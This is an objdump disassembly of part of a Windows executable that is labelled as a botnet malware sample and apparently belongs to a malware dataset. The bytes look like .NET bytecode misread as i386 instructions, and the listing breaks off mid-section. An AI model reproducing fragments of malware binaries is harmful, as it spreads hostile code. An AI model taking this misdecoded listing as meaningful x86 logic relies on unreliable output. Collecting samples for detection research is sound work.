
malware_samples/botnet/270887cd3939ea9eb91d47ce5eeedd4141cb112501d42844020e496c76384608.exe:     file format pei-i386


Disassembly of section .text:

00402000 <.text>:
  402000:	e0 c6                	loopne 0x401fc8
  402002:	00 00                	add    %al,(%eax)
  402004:	00 00                	add    %al,(%eax)
  402006:	00 00                	add    %al,(%eax)
  402008:	48                   	dec    %eax
  402009:	00 00                	add    %al,(%eax)
  40200b:	00 02                	add    %al,(%edx)
  40200d:	00 05 00 fc 59 00    	add    %al,0x59fc00
  402013:	00 a8 6c 00 00 03    	add    %ch,0x300006c(%eax)
  402019:	00 00                	add    %al,(%eax)
  40201b:	00 01                	add    %al,(%ecx)
  40201d:	00 00                	add    %al,(%eax)
  40201f:	06                   	push   %es
	...
  402050:	bf eb 1e 56 fb       	mov    $0xfb561eeb,%edi
  402055:	cd 97                	int    $0x97
  402057:	3b b2 19 02 24 30    	cmp    0x30240219(%edx),%esi
  40205d:	a5                   	movsl  %ds:(%esi),%es:(%edi)
  40205e:	78 43                	js     0x4020a3
  402060:	00 3d 56 44 d2 1e    	add    %bh,0x1ed24456
  402066:	62 b9 d4 f1 80 e7    	bound  %edi,-0x187f0e2c(%ecx)
  40206c:	e6 c3                	out    %al,$0xc3
  40206e:	39 41 2e             	cmp    %eax,0x2e(%ecx)
  402071:	00 2f                	add    %ch,(%edi)
  402073:	00 5c 00 00          	add    %bl,0x0(%eax,%eax,1)
  402077:	00 1e                	add    %bl,(%esi)
  402079:	02 28                	add    (%eax),%ch
  40207b:	18 00                	sbb    %al,(%eax)
  40207d:	00 0a                	add    %cl,(%edx)
  40207f:	2a 1a                	sub    (%edx),%bl
  402081:	7e 13                	jle    0x402096
  402083:	00 00                	add    %al,(%eax)
  402085:	04 2a                	add    $0x2a,%al
  402087:	1e                   	push   %ds
  402088:	02 80 13 00 00 04    	add    0x4000013(%eax),%al
  40208e:	2a 1a                	sub    (%edx),%bl
  402090:	7e 14                	jle    0x4020a6
  402092:	00 00                	add    %al,(%eax)
  402094:	04 2a                	add    $0x2a,%al
  402096:	1e                   	push   %ds
  402097:	02 80 14 00 00 04    	add    0x4000014(%eax),%al
  40209d:	2a 1a                	sub    (%edx),%bl
  40209f:	7e 15                	jle    0x4020b6
  4020a1:	00 00                	add    %al,(%eax)
  4020a3:	04 2a                	add    $0x2a,%al
  4020a5:	1e                   	push   %ds
  4020a6:	02 80 15 00 00 04    	add    0x4000015(%eax),%al
  4020ac:	2a 1a                	sub    (%edx),%bl
  4020ae:	7e 16                	jle    0x4020c6
  4020b0:	00 00                	add    %al,(%eax)
  4020b2:	04 2a                	add    $0x2a,%al
  4020b4:	1e                   	push   %ds
  4020b5:	02 80 16 00 00 04    	add    0x4000016(%eax),%al
  4020bb:	2a 1a                	sub    (%edx),%bl
  4020bd:	7e 17                	jle    0x4020d6
  4020bf:	00 00                	add    %al,(%eax)
  4020c1:	04 2a                	add    $0x2a,%al
  4020c3:	1e                   	push   %ds
  4020c4:	02 80 17 00 00 04    	add    0x4000017(%eax),%al
  4020ca:	2a 1a                	sub    (%edx),%bl
  4020cc:	7e 18                	jle    0x4020e6
  4020ce:	00 00                	add    %al,(%eax)
  4020d0:	04 2a                	add    $0x2a,%al
  4020d2:	1e                   	push   %ds
  4020d3:	02 80 18 00 00 04    	add    0x4000018(%eax),%al
  4020d9:	2a 1a                	sub    (%edx),%bl
  4020db:	7e 19                	jle    0x4020f6
  4020dd:	00 00                	add    %al,(%eax)
  4020df:	04 2a                	add    $0x2a,%al
  4020e1:	1e                   	push   %ds
  4020e2:	02 80 19 00 00 04    	add    0x4000019(%eax),%al
  4020e8:	2a 1a                	sub    (%edx),%bl
  4020ea:	7e 1a                	jle    0x402106
  4020ec:	00 00                	add    %al,(%eax)
  4020ee:	04 2a                	add    $0x2a,%al
  4020f0:	1a 7e 1b             	sbb    0x1b(%esi),%bh
  4020f3:	00 00                	add    %al,(%eax)
  4020f5:	04 2a                	add    $0x2a,%al
  4020f7:	1e                   	push   %ds
  4020f8:	02 80 1b 00 00 04    	add    0x400001b(%eax),%al
  4020fe:	2a 1a                	sub    (%edx),%bl
  402100:	7e 1c                	jle    0x40211e
  402102:	00 00                	add    %al,(%eax)
  402104:	04 2a                	add    $0x2a,%al
  402106:	1e                   	push   %ds
  402107:	02 80 1c 00 00 04    	add    0x400001c(%eax),%al
  40210d:	2a 1a                	sub    (%edx),%bl
  40210f:	7e 1d                	jle    0x40212e
  402111:	00 00                	add    %al,(%eax)
  402113:	04 2a                	add    $0x2a,%al
  402115:	1e                   	push   %ds
  402116:	02 80 1d 00 00 04    	add    0x400001d(%eax),%al
  40211c:	2a 2a                	sub    (%edx),%ch
  40211e:	02 28                	add    (%eax),%ch
  402120:	3e 00 00             	add    %al,%ds:(%eax)
  402123:	0a 16                	or     (%esi),%dl
  402125:	fe 03                	incb   (%ebx)
  402127:	2a 32                	sub    (%edx),%dh
  402129:	7e 0b                	jle    0x402136
  40212b:	00 00                	add    %al,(%eax)
  40212d:	04 03                	add    $0x3,%al
  40212f:	6f                   	outsl  %ds:(%esi),(%dx)
  402130:	3f                   	aas
  402131:	00 00                	add    %al,(%eax)
  402133:	0a 2a                	or     (%edx),%ch
  402135:	2e 73 18             	jae,pn 0x402150
  402138:	00 00                	add    %al,(%eax)
  40213a:	0a 80 1a 00 00 04    	or     0x400001a(%eax),%al
  402140:	2a e6                	sub    %dh,%ah
  402142:	28 29                	sub    %ch,(%ecx)
  402144:	00 00                	add    %al,(%eax)
  402146:	06                   	push   %es
  402147:	3a 28                	cmp    (%eax),%ch
  402149:	00 00                	add    %al,(%eax)
  40214b:	00 28                	add    %ch,(%eax)
  40214d:	2a 00                	sub    (%eax),%al
  40214f:	00 06                	add    %al,(%esi)
  402151:	3a 1e                	cmp    (%esi),%bl
  402153:	00 00                	add    %al,(%eax)
  402155:	00 28                	add    %ch,(%eax)
  402157:	2b 00                	sub    (%eax),%eax
  402159:	00 06                	add    %al,(%esi)
  40215b:	3a 14 00             	cmp    (%eax,%eax,1),%dl
  40215e:	00 00                	add    %al,(%eax)
  402160:	28 27                	sub    %ah,(%edi)
  402162:	00 00                	add    %al,(%eax)
  402164:	06                   	push   %es
  402165:	3a 0a                	cmp    (%edx),%cl
  402167:	00 00                	add    %al,(%eax)
  402169:	00 28                	add    %ch,(%eax)
  40216b:	28 00                	sub    %al,(%eax)
  40216d:	00 06                	add    %al,(%esi)
  40216f:	39 06                	cmp    %eax,(%esi)
  402171:	00 00                	add    %al,(%eax)
  402173:	00 14 28             	add    %dl,(%eax,%ebp,1)
  402176:	76 00                	jbe    0x402178
  402178:	00 0a                	add    %cl,(%edx)
  40217a:	2a 56 28             	sub    0x28(%esi),%dl
  40217d:	9c                   	pushf
  40217e:	00 00                	add    %al,(%eax)
  402180:	0a 73 9d             	or     -0x63(%ebx),%dh
  402183:	00 00                	add    %al,(%eax)
  402185:	0a 20                	or     (%eax),%ah
  402187:	20 02                	and    %al,(%edx)
  402189:	00 00                	add    %al,(%eax)
  40218b:	6f                   	outsl  %ds:(%esi),(%dx)
  40218c:	9e                   	sahf
  40218d:	00 00                	add    %al,(%eax)
  40218f:	0a 2a                	or     (%edx),%ch
  402191:	6e                   	outsb  %ds:(%esi),(%dx)
  402192:	7e 1e                	jle    0x4021b2
  402194:	00 00                	add    %al,(%eax)
  402196:	04 39                	add    $0x39,%al
  402198:	10 00                	adc    %al,(%eax)
  40219a:	00 00                	add    %al,(%eax)
  40219c:	7e 1e                	jle    0x4021bc
  40219e:	00 00                	add    %al,(%eax)
  4021a0:	04 6f                	add    $0x6f,%al
  4021a2:	ad                   	lods   %ds:(%esi),%eax
  4021a3:	00 00                	add    %al,(%eax)
  4021a5:	0a 14 80             	or     (%eax,%eax,4),%dl
  4021a8:	1e                   	push   %ds
  4021a9:	00 00                	add    %al,(%eax)
  4021ab:	04 2a                	add    $0x2a,%al
  4021ad:	7e 7e                	jle    0x40222d
  4021af:	0f 00 00             	sldt   (%eax)
  4021b2:	04 28                	add    $0x28,%al
  4021b4:	17                   	pop    %ss
  4021b5:	00 00                	add    %al,(%eax)
  4021b7:	0a 39                	or     (%ecx),%bh
  4021b9:	0f 00 00             	sldt   (%eax)
  4021bc:	00 28                	add    %ch,(%eax)
  4021be:	30 00                	xor    %al,(%eax)
  4021c0:	00 06                	add    %al,(%esi)
  4021c2:	39 05 00 00 00 28    	cmp    %eax,0x28000000
  4021c8:	40                   	inc    %eax
  4021c9:	00 00                	add    %al,(%eax)
  4021cb:	06                   	push   %es
  4021cc:	2a 56 72             	sub    0x72(%esi),%dl
  4021cf:	45                   	inc    %ebp
  4021d0:	25 00 70 7e 10       	and    $0x107e7000,%eax
  4021d5:	00 00                	add    %al,(%eax)
  4021d7:	04 28                	add    $0x28,%al
  4021d9:	6f                   	outsl  %ds:(%esi),(%dx)
  4021da:	00 00                	add    %al,(%eax)
  4021dc:	0a 80 23 00 00 04    	or     0x4000023(%eax),%al
  4021e2:	2a be 73 94 00 00    	sub    0x9473(%esi),%bh
  4021e8:	06                   	push   %es
  4021e9:	25 72 f9 20 00       	and    $0x20f972,%eax
  4021ee:	70 6f                	jo     0x40225f
  4021f0:	7f 00                	jg     0x4021f2
  4021f2:	00 06                	add    %al,(%esi)
  4021f4:	72 f1                	jb     0x4021e7
  4021f6:	25 00 70 6f 8c       	and    $0x8c6f7000,%eax
  4021fb:	00 00                	add    %al,(%eax)
  4021fd:	06                   	push   %es
  4021fe:	6f                   	outsl  %ds:(%esi),(%dx)
  4021ff:	89 00                	mov    %eax,(%eax)
  402201:	00 06                	add    %al,(%esi)
  402203:	28 20                	sub    %ah,(%eax)
  402205:	00 00                	add    %al,(%eax)
  402207:	06                   	push   %es
  402208:	20 e8                	and    %ch,%al
  40220a:	03 00                	add    (%eax),%eax
  40220c:	00 28                	add    %ch,(%eax)
  40220e:	14 00                	adc    $0x0,%al
  402210:	00 0a                	add    %cl,(%edx)
  402212:	2a da                	sub    %dl,%bl
  402214:	73 94                	jae    0x4021aa
  402216:	00 00                	add    %al,(%eax)
  402218:	06                   	push   %es
  402219:	25 72 f9 20 00       	and    $0x20f972,%eax
  40221e:	70 6f                	jo     0x40228f
  402220:	7f 00                	jg     0x402222
  402222:	00 06                	add    %al,(%esi)
  402224:	72 03                	jb     0x402229
  402226:	26 00 70 6f          	add    %dh,%es:0x6f(%eax)
  40222a:	8c 00                	mov    %es,(%eax)
  40222c:	00 06                	add    %al,(%esi)
  40222e:	25 72 03 26 00       	and    $0x260372,%eax
  402233:	70 6f                	jo     0x4022a4
  402235:	7f 00                	jg     0x402237
  402237:	00 06                	add    %al,(%esi)
  402239:	02 6f 8c             	add    -0x74(%edi),%ch
  40223c:	00 00                	add    %al,(%eax)
  40223e:	06                   	push   %es
  40223f:	6f                   	outsl  %ds:(%esi),(%dx)
  402240:	89 00                	mov    %eax,(%eax)
  402242:	00 06                	add    %al,(%esi)
  402244:	28 20                	sub    %ah,(%eax)
  402246:	00 00                	add    %al,(%eax)
  402248:	06                   	push   %es
  402249:	2a 2e                	sub    (%esi),%ch
  40224b:	73 c9                	jae    0x402216
  40224d:	00 00                	add    %al,(%eax)
  40224f:	0a 80 24 00 00 04    	or     0x4000024(%eax),%al
  402255:	2a 5e 02             	sub    0x2(%esi),%bl
  402258:	28 19                	sub    %bl,(%ecx)
  40225a:	00 00                	add    %al,(%eax)
  40225c:	0a 03                	or     (%ebx),%al
  40225e:	6f                   	outsl  %ds:(%esi),(%dx)
  40225f:	1f                   	pop    %ds
  402260:	00 00                	add    %al,(%eax)
  402262:	0a 28                	or     (%eax),%ch
  402264:	4d                   	dec    %ebp
  402265:	00 00                	add    %al,(%eax)
  402267:	06                   	push   %es
  402268:	28 ce                	sub    %cl,%dh
  40226a:	00 00                	add    %al,(%eax)
  40226c:	0a 2a                	or     (%edx),%ch
  40226e:	5e                   	pop    %esi
  40226f:	28 19                	sub    %bl,(%ecx)
  402271:	00 00                	add    %al,(%eax)
  402273:	0a 02                	or     (%edx),%al
  402275:	03 28                	add    (%eax),%ebp
  402277:	1a 00                	sbb    (%eax),%al
  402279:	00 0a                	add    %cl,(%edx)
  40227b:	28 4f 00             	sub    %cl,0x0(%edi)
  40227e:	00 06                	add    %al,(%esi)
  402280:	6f                   	outsl  %ds:(%esi),(%dx)
  402281:	1b 00                	sbb    (%eax),%eax
  402283:	00 0a                	add    %cl,(%edx)
  402285:	2a 62 1f             	sub    0x1f(%edx),%ah
  402288:	20 8d 44 00 00 01    	and    %cl,0x1000044(%ebp)
  40228e:	25 d0 2d 00 00       	and    $0x2dd0,%eax
  402293:	04 28                	add    $0x28,%al
  402295:	e4 00                	in     $0x0,%al
  402297:	00 0a                	add    %cl,(%edx)
  402299:	80 2c 00 00          	subb   $0x0,(%eax,%eax,1)
  40229d:	04 2a                	add    $0x2a,%al
  40229f:	32 7e 2e             	xor    0x2e(%esi),%bh
  4022a2:	00 00                	add    %al,(%eax)
  4022a4:	04 02                	add    $0x2,%al
  4022a6:	6f                   	outsl  %ds:(%esi),(%dx)
  4022a7:	1f                   	pop    %ds
  4022a8:	00 00                	add    %al,(%eax)
  4022aa:	0a 2a                	or     (%edx),%ch
  4022ac:	32 7e 2e             	xor    0x2e(%esi),%bh
  4022af:	00 00                	add    %al,(%eax)
  4022b1:	04 02                	add    $0x2,%al
  4022b3:	6f                   	outsl  %ds:(%esi),(%dx)
  4022b4:	1b 00                	sbb    (%eax),%eax
  4022b6:	00 0a                	add    %cl,(%edx)
  4022b8:	2a 32                	sub    (%edx),%dh
  4022ba:	02 28                	add    (%eax),%ch
  4022bc:	e7 00                	out    %eax,$0x0
  4022be:	00 0a                	add    %cl,(%edx)
  4022c0:	28 58 00             	sub    %bl,0x0(%eax)
  4022c3:	00 06                	add    %al,(%esi)
  4022c5:	2a 8e 1a 8d 44 00    	sub    0x448d1a(%esi),%cl
  4022cb:	00 01                	add    %al,(%ecx)
  4022cd:	25 19 02 d2 9c       	and    $0x9cd20219,%eax
  4022d2:	25 18 02 1e 63       	and    $0x631e0218,%eax
  4022d7:	d2 9c 25 17 02 1f 10 	rcrb   %cl,0x101f0217(%ebp,%eiz,1)
  4022de:	63 d2                	arpl   %edx,%edx
  4022e0:	9c                   	pushf
  4022e1:	25 16 02 1f 18       	and    $0x181f0216,%eax
  4022e6:	63 d2                	arpl   %edx,%edx
  4022e8:	9c                   	pushf
  4022e9:	2a 4e 18             	sub    0x18(%esi),%cl
  4022ec:	8d 44 00 00          	lea    0x0(%eax,%eax,1),%eax
  4022f0:	01 25 17 02 d2 9c    	add    %esp,0x9cd20217
  4022f6:	25 16 02 1e 63       	and    $0x631e0216,%eax
  4022fb:	d2 9c 2a 32 02 28 e8 	rcrb   %cl,-0x17d7fdce(%edx,%ebp,1)
  402302:	00 00                	add    %al,(%eax)
  402304:	0a 28                	or     (%eax),%ch
  402306:	58                   	pop    %eax
  402307:	00 00                	add    %al,(%eax)
  402309:	06                   	push   %es
  40230a:	2a 2e                	sub    (%esi),%ch
  40230c:	73 e9                	jae    0x4022f7
  40230e:	00 00                	add    %al,(%eax)
  402310:	0a 80 2e 00 00 04    	or     0x400002e(%eax),%al
  402316:	2a 56 02             	sub    0x2(%esi),%dl
  402319:	15 7d 30 00 00       	adc    $0x307d,%eax
  40231e:	04 02                	add    $0x2,%al
  402320:	28 18                	sub    %bl,(%eax)
  402322:	00 00                	add    %al,(%eax)
  402324:	0a 02                	or     (%edx),%al
  402326:	03 7d 2f             	add    0x2f(%ebp),%edi
  402329:	00 00                	add    %al,(%eax)
  40232b:	04 2a                	add    $0x2a,%al
  40232d:	4a                   	dec    %edx
  40232e:	02 7b 2f             	add    0x2f(%ebx),%bh
  402331:	00 00                	add    %al,(%eax)
  402333:	04 02                	add    $0x2,%al
  402335:	7b 30                	jnp    0x402367
  402337:	00 00                	add    %al,(%eax)
  402339:	04 6f                	add    $0x6f,%al
  40233b:	ea 00 00 0a 2a 8a 02 	ljmp   $0x28a,$0x2a0a0000
  402342:	02 7b 30             	add    0x30(%ebx),%bh
  402345:	00 00                	add    %al,(%eax)
  402347:	04 17                	add    $0x17,%al
  402349:	58                   	pop    %eax
  40234a:	7d 30                	jge    0x40237c
  40234c:	00 00                	add    %al,(%eax)
  40234e:	04 02                	add    $0x2,%al
  402350:	7b 30                	jnp    0x402382
  402352:	00 00                	add    %al,(%eax)
  402354:	04 02                	add    $0x2,%al
  402356:	7b 2f                	jnp    0x402387
  402358:	00 00                	add    %al,(%eax)
  40235a:	04 6f                	add    $0x6f,%al
  40235c:	eb 00                	jmp    0x40235e
  40235e:	00 0a                	add    %cl,(%edx)
  402360:	fe 04 2a             	incb   (%edx,%ebp,1)
  402363:	22 02                	and    (%edx),%al
  402365:	15 7d 30 00 00       	adc    $0x307d,%eax
  40236a:	04 2a                	add    $0x2a,%al
  40236c:	56                   	push   %esi
  40236d:	02 28                	add    (%eax),%ch
  40236f:	18 00                	sbb    %al,(%eax)
  402371:	00 0a                	add    %cl,(%edx)
  402373:	02 03                	add    (%ebx),%al
  402375:	7d 32                	jge    0x4023a9
  402377:	00 00                	add    %al,(%eax)
  402379:	04 02                	add    $0x2,%al
  40237b:	04 7d                	add    $0x7d,%al
  40237d:	31 00                	xor    %eax,(%eax)
  40237f:	00 04 2a             	add    %al,(%edx,%ebp,1)
  402382:	32 02                	xor    (%edx),%al
  402384:	7b 32                	jnp    0x4023b8
  402386:	00 00                	add    %al,(%eax)
  402388:	04 6f                	add    $0x6f,%al
  40238a:	71 00                	jno    0x40238c
  40238c:	00 06                	add    %al,(%esi)
  40238e:	2a 4e 02             	sub    0x2(%esi),%cl
  402391:	7b 32                	jnp    0x4023c5
  402393:	00 00                	add    %al,(%eax)
  402395:	04 6f                	add    $0x6f,%al
  402397:	71 00                	jno    0x402399
  402399:	00 06                	add    %al,(%esi)
  40239b:	25 03 6f 8c 00       	and    $0x8c6f03,%eax
  4023a0:	00 06                	add    %al,(%esi)
  4023a2:	2a 4e 02             	sub    0x2(%esi),%cl
  4023a5:	7b 32                	jnp    0x4023d9
  4023a7:	00 00                	add    %al,(%eax)
  4023a9:	04 6f                	add    $0x6f,%al
  4023ab:	71 00                	jno    0x4023ad
  4023ad:	00 06                	add    %al,(%esi)
  4023af:	25 03 6f 74 00       	and    $0x746f03,%eax
  4023b4:	00 06                	add    %al,(%esi)
  4023b6:	2a 4e 02             	sub    0x2(%esi),%cl
  4023b9:	7b 32                	jnp    0x4023ed
  4023bb:	00 00                	add    %al,(%eax)
  4023bd:	04 6f                	add    $0x6f,%al
  4023bf:	71 00                	jno    0x4023c1
  4023c1:	00 06                	add    %al,(%esi)
  4023c3:	25 03 6f 85 00       	and    $0x856f03,%eax
  4023c8:	00 06                	add    %al,(%esi)
  4023ca:	2a 36                	sub    (%esi),%dh
  4023cc:	02 7b 31             	add    0x31(%ebx),%bh
  4023cf:	00 00                	add    %al,(%eax)
  4023d1:	04 03                	add    $0x3,%al
  4023d3:	6f                   	outsl  %ds:(%esi),(%dx)
  4023d4:	ea 00 00 0a 2a 32 02 	ljmp   $0x232,$0x2a0a0000
  4023db:	7b 31                	jnp    0x40240e
  4023dd:	00 00                	add    %al,(%eax)
  4023df:	04 6f                	add    $0x6f,%al
  4023e1:	eb 00                	jmp    0x4023e3
  4023e3:	00 0a                	add    %cl,(%edx)
  4023e5:	2a 66 02             	sub    0x2(%esi),%ah
  4023e8:	03 7d 33             	add    0x33(%ebp),%edi
  4023eb:	00 00                	add    %al,(%eax)
  4023ed:	04 02                	add    $0x2,%al
  4023ef:	02 7b 33             	add    0x33(%ebx),%bh
  4023f2:	00 00                	add    %al,(%eax)
  4023f4:	04 6f                	add    $0x6f,%al
  4023f6:	7d 00                	jge    0x4023f8
  4023f8:	00 0a                	add    %cl,(%edx)
  4023fa:	7d 34                	jge    0x402430
  4023fc:	00 00                	add    %al,(%eax)
  4023fe:	04 2a                	add    $0x2a,%al
  402400:	82 02 7b             	addb   $0x7b,(%edx)
  402403:	36 00 00             	add    %al,%ss:(%eax)
  402406:	04 18                	add    $0x18,%al
  402408:	3b 0d 00 00 00 02    	cmp    0x2000000,%ecx
  40240e:	28 6b 00             	sub    %ch,0x0(%ebx)
  402411:	00 06                	add    %al,(%esi)
  402413:	02 18                	add    (%eax),%bl
  402415:	7d 36                	jge    0x40244d
  402417:	00 00                	add    %al,(%eax)
  402419:	04 02                	add    $0x2,%al
  40241b:	28 6c 00 00          	sub    %ch,0x0(%eax,%eax,1)
  40241f:	06                   	push   %es
  402420:	2a 82 02 7b 36 00    	sub    0x367b02(%edx),%al
  402426:	00 04 19             	add    %al,(%ecx,%ebx,1)
  402429:	3b 0d 00 00 00 02    	cmp    0x2000000,%ecx
  40242f:	28 6b 00             	sub    %ch,0x0(%ebx)
  402432:	00 06                	add    %al,(%esi)
  402434:	02 19                	add    (%ecx),%bl
  402436:	7d 36                	jge    0x40246e
  402438:	00 00                	add    %al,(%eax)
  40243a:	04 02                	add    $0x2,%al
  40243c:	28 6c 00 00          	sub    %ch,0x0(%eax,%eax,1)
  402440:	06                   	push   %es
  402441:	2a 1e                	sub    (%esi),%bl
  402443:	02 28                	add    (%eax),%ch
  402445:	70 00                	jo     0x402447
  402447:	00 06                	add    %al,(%esi)
  402449:	2a 52 02             	sub    0x2(%edx),%dl
  40244c:	03 8c 68 00 00 01 7d 	add    0x7d010000(%eax,%ebp,2),%ecx
  402453:	35 00 00 04 02       	xor    $0x2040000,%eax
  402458:	1b 7d 36             	sbb    0x36(%ebp),%edi
  40245b:	00 00                	add    %al,(%eax)
  40245d:	04 2a                	add    $0x2a,%al
  40245f:	52                   	push   %edx
  402460:	02 03                	add    (%ebx),%al
  402462:	8c 95 00 00 01 7d    	mov    %ss,0x7d010000(%ebp)
  402468:	35 00 00 04 02       	xor    $0x2040000,%eax
  40246d:	1c 7d                	sbb    $0x7d,%al
  40246f:	36 00 00             	add    %al,%ss:(%eax)
  402472:	04 2a                	add    $0x2a,%al
  402474:	42                   	inc    %edx
  402475:	02 03                	add    (%ebx),%al
  402477:	7d 35                	jge    0x4024ae
  402479:	00 00                	add    %al,(%eax)
  40247b:	04 02                	add    $0x2,%al
  40247d:	1f                   	pop    %ds
  40247e:	0b 7d 36             	or     0x36(%ebp),%edi
  402481:	00 00                	add    %al,(%eax)
  402483:	04 2a                	add    $0x2a,%al
  402485:	52                   	push   %edx
  402486:	02 28                	add    (%eax),%ch
  402488:	70 00                	jo     0x40248a
  40248a:	00 06                	add    %al,(%esi)
  40248c:	25 03 7d 33 00       	and    $0x337d03,%eax
  402491:	00 04 04             	add    %al,(%esp,%eax,1)
  402494:	6f                   	outsl  %ds:(%esi),(%dx)
  402495:	81 00 00 06 2a 56    	addl   $0x562a0600,(%eax)
  40249b:	02 28                	add    (%eax),%ch
  40249d:	70 00                	jo     0x40249f
  40249f:	00 06                	add    %al,(%esi)
  4024a1:	25 03 7d 33 00       	and    $0x337d03,%eax
  4024a6:	00 04 04             	add    %al,(%esp,%eax,1)
  4024a9:	6a 6f                	push   $0x6f
  4024ab:	74 00                	je     0x4024ad
  4024ad:	00 06                	add    %al,(%esi)
  4024af:	2a 56 02             	sub    0x2(%esi),%dl
  4024b2:	28 6b 00             	sub    %ch,0x0(%ebx)
  4024b5:	00 06                	add    %al,(%esi)
  4024b7:	02 14 7d 35 00 00 04 	add    0x4000035(,%edi,2),%dl
  4024be:	02 17                	add    (%edi),%dl
  4024c0:	7d 36                	jge    0x4024f8
  4024c2:	00 00                	add    %al,(%eax)
  4024c4:	04 2a                	add    $0x2a,%al
  4024c6:	3e 02 03             	add    %ds:(%ebx),%al
  4024c9:	7d 35                	jge    0x402500
  4024cb:	00 00                	add    %al,(%eax)
  4024cd:	04 02                	add    $0x2,%al
  4024cf:	1a 7d 36             	sbb    0x36(%ebp),%bh
  4024d2:	00 00                	add    %al,(%eax)
  4024d4:	04 2a                	add    $0x2a,%al
  4024d6:	76 02                	jbe    0x4024da
  4024d8:	7b 35                	jnp    0x40250f
  4024da:	00 00                	add    %al,(%eax)
  4024dc:	04 3a                	add    $0x3a,%al
  4024de:	06                   	push   %es
  4024df:	00 00                	add    %al,(%eax)
  4024e1:	00 72 97             	add    %dh,-0x69(%edx)
  4024e4:	03 00                	add    (%eax),%eax
  4024e6:	70 2a                	jo     0x402512
  4024e8:	02 7b 35             	add    0x35(%ebx),%bh
  4024eb:	00 00                	add    %al,(%eax)
  4024ed:	04 6f                	add    $0x6f,%al
  4024ef:	38 00                	cmp    %al,(%eax)
  4024f1:	00 0a                	add    %cl,(%edx)
  4024f3:	2a 52 02             	sub    0x2(%edx),%dl
  4024f6:	1d 7d 36 00 00       	sbb    $0x367d,%eax
  4024fb:	04 02                	add    $0x2,%al
  4024fd:	03 8c 6c 00 00 01 7d 	add    0x7d010000(%esp,%ebp,2),%ecx
  402504:	35 00 00 04 2a       	xor    $0x2a040000,%eax
  402509:	56                   	push   %esi
  40250a:	02 1f                	add    (%edi),%bl
  40250c:	09 7d 36             	or     %edi,0x36(%ebp)
  40250f:	00 00                	add    %al,(%eax)
  402511:	04 02                	add    $0x2,%al
  402513:	03 8c 97 00 00 01 7d 	add    0x7d010000(%edi,%edx,4),%ecx
  40251a:	35 00 00 04 2a       	xor    $0x2a040000,%eax
  40251f:	52                   	push   %edx
  402520:	02 1e                	add    (%esi),%bl
  402522:	7d 36                	jge    0x40255a
  402524:	00 00                	add    %al,(%eax)
  402526:	04 02                	add    $0x2,%al
  402528:	03 8c 96 00 00 01 7d 	add    0x7d010000(%esi,%edx,4),%ecx
  40252f:	35 00 00 04 2a       	xor    $0x2a040000,%eax
  402534:	1e                   	push   %ds
  402535:	02 28                	add    (%eax),%ch
  402537:	82 00 00             	addb   $0x0,(%eax)
  40253a:	06                   	push   %es
  40253b:	2a 22                	sub    (%edx),%ah
  40253d:	02 03                	add    (%ebx),%al
  40253f:	28 81 00 00 06 2a    	sub    %al,0x2a060000(%ecx)
  402545:	1e                   	push   %ds
  402546:	02 28                	add    (%eax),%ch
  402548:	77 00                	ja     0x40254a
  40254a:	00 06                	add    %al,(%esi)
  40254c:	2a 22                	sub    (%edx),%ah
  40254e:	02 03                	add    (%ebx),%al
  402550:	28 74 00 00          	sub    %dh,0x0(%eax,%eax,1)
  402554:	06                   	push   %es
  402555:	2a 1e                	sub    (%esi),%bl
  402557:	02 28                	add    (%eax),%ch
  402559:	78 00                	js     0x40255b
  40255b:	00 06                	add    %al,(%esi)
  40255d:	2a 22                	sub    (%edx),%ah
  40255f:	02 03                	add    (%ebx),%al
  402561:	28 85 00 00 06 2a    	sub    %al,0x2a060000(%ebp)
  402567:	1e                   	push   %ds
  402568:	02 7b 36             	add    0x36(%ebx),%bh
  40256b:	00 00                	add    %al,(%eax)
  40256d:	04 2a                	add    $0x2a,%al
  40256f:	32 02                	xor    (%edx),%al
  402571:	7b 38                	jnp    0x4025ab
  402573:	00 00                	add    %al,(%eax)
  402575:	04 73                	add    $0x73,%al
  402577:	5f                   	pop    %edi
  402578:	00 00                	add    %al,(%eax)
  40257a:	06                   	push   %es
  40257b:	2a 4a 02             	sub    0x2(%edx),%cl
  40257e:	73 c9                	jae    0x402549
  402580:	00 00                	add    %al,(%eax)
  402582:	0a 7d 38             	or     0x38(%ebp),%bh
  402585:	00 00                	add    %al,(%eax)
  402587:	04 02                	add    $0x2,%al
  402589:	28 18                	sub    %bl,(%eax)
  40258b:	00 00                	add    %al,(%eax)
  40258d:	0a 2a                	or     (%edx),%ch
  40258f:	3a 02                	cmp    (%edx),%al
  402591:	6f                   	outsl  %ds:(%esi),(%dx)
  402592:	00 01                	add    %al,(%ecx)
  402594:	00 0a                	add    %cl,(%edx)
  402596:	d2 02                	rolb   %cl,(%edx)
  402598:	28 97 00 00 06 2a    	sub    %dl,0x2a060000(%edi)
  40259e:	32 02                	xor    (%edx),%al
  4025a0:	20 c0                	and    %al,%al
  4025a2:	00 00                	add    %al,(%eax)
  4025a4:	00 6f ee             	add    %ch,-0x12(%edi)
  4025a7:	00 00                	add    %al,(%eax)
  4025a9:	0a 2a                	or     (%edx),%ch
  4025ab:	6a 02                	push   $0x2
  4025ad:	20 cb                	and    %cl,%bl
  4025af:	00 00                	add    %al,(%eax)
  4025b1:	00 6f ee             	add    %ch,-0x12(%edi)
  4025b4:	00 00                	add    %al,(%eax)
  4025b6:	0a 02                	or     (%edx),%al
  4025b8:	03 28                	add    (%eax),%ebp
  4025ba:	5c                   	pop    %esp
  4025bb:	00 00                	add    %al,(%eax)
  4025bd:	06                   	push   %es
  4025be:	16                   	push   %ss
  4025bf:	1e                   	push   %ds
  4025c0:	6f                   	outsl  %ds:(%esi),(%dx)
  4025c1:	4c                   	dec    %esp
  4025c2:	00 00                	add    %al,(%eax)
  4025c4:	0a 2a                	or     (%edx),%ch
  4025c6:	7e 02                	jle    0x4025ca
  4025c8:	20 ca                	and    %cl,%dl
  4025ca:	00 00                	add    %al,(%eax)
  4025cc:	00 6f ee             	add    %ch,-0x12(%edi)
  4025cf:	00 00                	add    %al,(%eax)
  4025d1:	0a 02                	or     (%edx),%al
  4025d3:	03 28                	add    (%eax),%ebp
  4025d5:	fd                   	std
  4025d6:	00 00                	add    %al,(%eax)
  4025d8:	0a 28                	or     (%eax),%ch
  4025da:	58                   	pop    %eax
  4025db:	00 00                	add    %al,(%eax)
  4025dd:	06                   	push   %es
  4025de:	16                   	push   %ss
  4025df:	1a 6f 4c             	sbb    0x4c(%edi),%ch
  4025e2:	00 00                	add    %al,(%eax)
  4025e4:	0a 2a                	or     (%edx),%ch
  4025e6:	7a 03                	jp     0x4025eb
  4025e8:	39 0c 00             	cmp    %ecx,(%eax,%eax,1)
